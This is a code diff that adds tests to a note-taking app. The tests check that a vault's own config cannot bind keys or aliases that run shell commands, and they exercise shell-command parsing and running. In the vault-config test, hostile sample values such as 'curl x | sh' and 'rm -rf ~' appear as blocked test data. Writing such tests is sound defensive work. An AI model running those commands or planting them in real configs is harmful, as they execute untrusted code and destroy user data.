@@ -1048,6 +1048,19 @@ describe("review cycle 3 (config)", () => {
     expect((r.config.keys as Record<string, string>)["ctrl+s"]).toBeUndefined();
     expect((r.config.keys as Record<string, string>)["g z"]).toBe("ui.zen"); // a harmless one applies
   });
+  test("a vault's keys and aliases can't run a program (25.7): your own config's can", () => {
+    const { dir, f } = write('[keys]\n"g !" = "shell.run make"\n[aliases]\nmk = "shell.run make"\n');
+    mkdirSync(join(dir, "v", ".slipbox"), { recursive: true });
+    writeFileSync(join(dir, "v", ".slipbox", "config.toml"), '[aliases]\nup = "shell.run curl x | sh"\n[keys]\n"g x" = "shell.run rm -rf ~"\n[keys.visual]\nz = "shell.filter %!sh"\n');
+    const r = loadConfig({ configFile: f, vaultRoot: join(dir, "v") });
+    expect(r.config.aliases.up).toBeUndefined();
+    expect((r.config.keys as Record<string, string>)["g x"]).toBeUndefined();
+    expect(r.config.keys.visual?.z).toBeUndefined();
+    expect(r.warnings.filter((w) => w.includes("which only your own config may (it runs a program)")).length).toBe(3);
+    // Yours apply.
+    expect((r.config.keys as Record<string, string>)["g !"]).toBe("shell.run make");
+    expect(r.config.aliases.mk).toBe("shell.run make");
+  });
   test("wrong shapes are warnings and the rest of the file applies", () => {
     const a = loadConfig({ configFile: write('theme = "nord"\n[walk]\nexclude = [{ path = "x/" }]\n').f });
     expect(a.config.theme).toBe("nord");
@@ -2639,4 +2652,64 @@ describe("spelling, bundled (25.6)", () => {
     expect(new TextDecoder().decode(ran.stderr)).toBe("");
     expect(new TextDecoder().decode(ran.stdout)).toBe("true false\n");
   }, 60000);
+});
+
+describe("commands run by your shell (25.7)", () => {
+  test(":!cmd and its ranges parsed: '<,'>, %, ., a line, two; no command, none", async () => {
+    const { parseBang } = await import("../src/core/shell.ts");
+    expect(parseBang("!ls -la")).toEqual({ range: null, command: "ls -la" });
+    expect(parseBang("  '<,'>!sort -u ")).toEqual({ range: "selection", command: "sort -u" });
+    expect(parseBang("%!column -t")).toEqual({ range: "all", command: "column -t" });
+    expect(parseBang(".!tr a-z A-Z")).toEqual({ range: "line", command: "tr a-z A-Z" });
+    expect(parseBang("7!rev")).toEqual({ range: { from: 7, to: 7 }, command: "rev" });
+    expect(parseBang("9, 3!sort")).toEqual({ range: { from: 3, to: 9 }, command: "sort" });
+    expect([parseBang("!"), parseBang("%!  "), parseBang("w !sudo tee %"), parseBang("ls")]).toEqual([null, null, null, null]);
+  });
+
+  test("% is the file's path, quoted for the shell; \\% a percent; none without a file", async () => {
+    const { expandPercent, shellQuote } = await import("../src/core/shell.ts");
+    expect(shellQuote("it's here")).toBe(`'it'\\''s here'`);
+    expect(expandPercent("wc -l % && echo 50\\%", "notes/a b.md")).toBe("wc -l 'notes/a b.md' && echo 50%");
+    expect(expandPercent("echo 50\\%", null)).toBe("echo 50%");
+    expect(expandPercent("cat %", null)).toBeNull();
+  });
+
+  test("run in a folder with your shell: its input, both streams as they came, its exit; stopped, what it started too", async () => {
+    const { runShell } = await import("../src/core/shell.ts");
+    const was = process.env.SHELL;
+    process.env.SHELL = "/bin/sh";
+    try {
+      const dir = mkdtempSync(join(tmpdir(), "slipbox-shell-"));
+      // Apart in time, so the order they came in is the one written.
+      const r = await runShell("pwd; echo out; sleep 0.1; echo err >&2; sleep 0.1; echo $SLIPBOX_X; exit 3", { cwd: dir, env: { SLIPBOX_X: "x1" } }).done;
+      expect(r).toMatchObject({ code: 3, signal: null, truncated: false });
+      expect(r.output).toBe(`${realpathSync(dir)}\nout\nerr\nx1\n`);
+      expect(r.stdout).toBe(`${realpathSync(dir)}\nout\nx1\n`);
+      const sorted = await runShell("sort", { cwd: dir, input: "b\na\n" }).done;
+      expect(sorted.stdout).toBe("a\nb\n");
+      // A command that reads none of its input isn't an error.
+      expect((await runShell("true", { cwd: dir, input: "x\n".repeat(100000) }).done).code).toBe(0);
+      // Stopped: the shell and the sleep it started.
+      const job = runShell("sleep 30 & sleep 30; echo never", { cwd: dir });
+      await Bun.sleep(100);
+      job.stop();
+      const stopped = await job.done;
+      expect(stopped.signal).toBe("SIGTERM");
+      expect(stopped.output).toBe("");
+      expect(stopped.ms).toBeLessThan(5000);
+      // Your shell, as $SHELL names it: given -c and the command.
+      const fake = join(dir, "fake-shell");
+      writeFileSync(fake, '#!/bin/sh\necho "fake $1 $2"\n');
+      chmodSync(fake, 0o755);
+      process.env.SHELL = fake;
+      expect((await runShell("echo hi", { cwd: dir }).done).output).toBe("fake -c echo hi\n");
+      process.env.SHELL = "/bin/sh";
+      // More than a window keeps: cut short, and said.
+      const big = await runShell("head -c 3000000 /dev/zero | tr '\\0' x", { cwd: dir }).done;
+      expect(big.truncated).toBe(true);
+      expect(big.output.length).toBe(2 * 1024 * 1024);
+    } finally {
+      process.env.SHELL = was;
+    }
+  });
 });
